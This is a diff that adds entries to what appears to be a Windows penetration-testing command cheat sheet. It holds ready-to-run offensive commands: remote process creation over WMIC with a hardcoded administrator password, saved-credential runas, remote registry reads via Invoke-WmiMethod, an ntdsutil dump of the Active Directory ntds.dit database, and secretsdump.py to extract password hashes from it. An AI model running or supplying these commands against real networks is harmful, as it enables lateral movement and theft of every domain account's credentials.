@@ -143,3 +143,20 @@ powershell -encodedcommand XXXXXXXXXXXXXX
 
 #run cmd on remote computerName
 WMIC /user:administrator /password:Aa123456 /node:172.21.128.56 process call create "cmd.exe /c start.exe"
+
+#run as administrator
+runas /user:ComputerName\Username /savecred
+
+#invoke wmi with powershellPS C:\Windows\system32> [uint32]$hklm = 2147483650
+$subkey="SOFTWARE\Policies\Microsoft\Windows\DriverSearching"
+$value="DriverUpdateWizardWuSearchEnabled"
+Invoke-WmiMethod -computerName 10.10.10.45 -credential administrator -Namespace root\default -Class StdRegProv -Name GetDWORDValue -ArgumentList $hklm, $subkey, $value
+
+# Active Directory ntds.dit
+ntdsutil
+activate instance ntds
+ifm
+create full c:\output
+quit
+quit
+secretsdump.py -ntds '/Location/of/ntds.dit' -system '/Location/of/registry/SYSTEM' -outputfile hashes LOCAL
